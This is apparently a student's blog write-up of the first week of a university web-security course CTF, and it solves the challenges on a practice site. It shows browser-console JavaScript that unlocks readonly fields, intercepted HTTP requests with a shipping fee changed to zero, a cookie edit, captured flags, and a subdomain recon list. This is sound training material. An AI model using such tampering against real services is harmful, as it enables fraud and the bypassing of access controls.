---
title: "Course CTF: Week 0"
date: 2020-06-03T19:06:45+10:00

categories: ["Course CTF"]
hiddenFromHomePage: false
postMetaInFooter: false

flowchartDiagrams:
  enable: false
  options: ""

sequenceDiagrams: 
  enable: false
  options: ""

---

## Welcome!

* https://welcome.-QBSITE-

> `COMP6443{WELCOME_TO_COMP6843}`  
`COMP6443{WELCOME_TO_COMP6443.ejUyMDY2Nzc=.EbiD9yN4kUsUeWWqvAXhGw==}`

## Opened Account

Scenario: There is a readonly text input and checkbox field.  
Solution: Set the value of the text input to `yes`, and force the checkbox to be selected.

```js
document.querySelectorAll('[readonly]').forEach(e=>e.removeAttribute('readOnly'))
document.querySelectorAll('[type=checkbox]').forEach(e=>e.checked=true)
```

```
POST /open HTTP/1.1
Host: account.-QBSITE-
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 72
Origin: https://account.-QBSITE-
DNT: 1
Connection: close
Referer: https://account.-QBSITE-/open
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

name=Andrew+Wong&email=z5206677%40-QBSITE-&correct=yes&approval=on
```

> `COMP6443{DEV_TOOL_WORKS_GREAT.ejUyMDY2Nzc=.uu7GPnY4oF15UnpYCgmLLw==}`

## Received MasterCard

Site: https://card.-QBSITE-/ship  
Scenario: Shipping a card costs $2, but the user does not have any money.  
Solution: Intercept the HTTP Post request, and modify the `fee` field to 0.  

### Before

```
POST /ship HTTP/1.1
Host: card.-QBSITE-
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: https://card.-QBSITE-
DNT: 1
Connection: close
Referer: https://card.-QBSITE-/ship
Upgrade-Insecure-Requests: 1

name=Andrew+Wong&address=********&fee=2
```

### After

```
POST /ship HTTP/1.1
Host: card.-QBSITE-
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: https://card.-QBSITE-
DNT: 1
Connection: close
Referer: https://card.-QBSITE-/ship
Upgrade-Insecure-Requests: 1

name=Andrew+Wong&address=********&fee=0
```

> `COMP6443{BURP_SUITE_IS_EASY.ejUyMDY2Nzc=.L22UGr4pjylCq+yaTsOgUA==}`

## Cookies are delicious especially when they are free

Site: https://cookies.-QBSITE-/  
Scenario: The browser does not have the right cookie  
Solution: Modify the `lucky` cookie to `1`

`COMP6443{YUMMY.ejUyMDY2Nzc=.zO8Owu4Dkc2BJruVRuUBYg==}`


---

<!-- 

inurl
filetype
web.archive.org
dnsdumpster
hackertarget
crt.sh
shared certificated
 -->


* admin.-QBSITE-
* adserver.-QBSITE-
* banking.-QBSITE-
* blog.-QBSITE-
* card.-QBSITE-
* careers.-QBSITE-
* creditcard.-QBSITE-
* csp.-QBSITE-
* dev.-QBSITE-
* dev-eu1.-QBSITE-
* docs.-QBSITE-
* elasticsearch.-QBSITE-
* example.-QBSITE-
* gaia.-QBSITE-
* haas.-QBSITE-
* kibana.-QBSITE-
* kubernetes-dashboard.-QBSITE-
* m.-QBSITE-
* m.staging.-QBSITE-
* master.prod.-QBSITE-
* mobile.-QBSITE-
* prod.-QBSITE-
* reset-password.-QBSITE-
* staging.-QBSITE-
* super-secret.admin.-QBSITE-
* test.-QBSITE-
* vault42.-QBSITE-
* vault42.sandbox.-QBSITE-
* wallet.-QBSITE-
* whoami.-QBSITE-
* www-cdn.-QBSITE-
* www-cdn-au.-QBSITE-
* www-cdn-us.-QBSITE-
* www-cdn-hk.-QBSITE-
* www-dev.-QBSITE-
* www-preprod.-QBSITE-
* www-staging.-QBSITE-
* account.-QBSITE-
* www.-QBSITE-
* cookies.-QBSITE-
* gaia.-QBSITE-
* haas.-QBSITE-
* kb.-QBSITE-
* login.-QBSITE-
* welcome.-QBSITE-
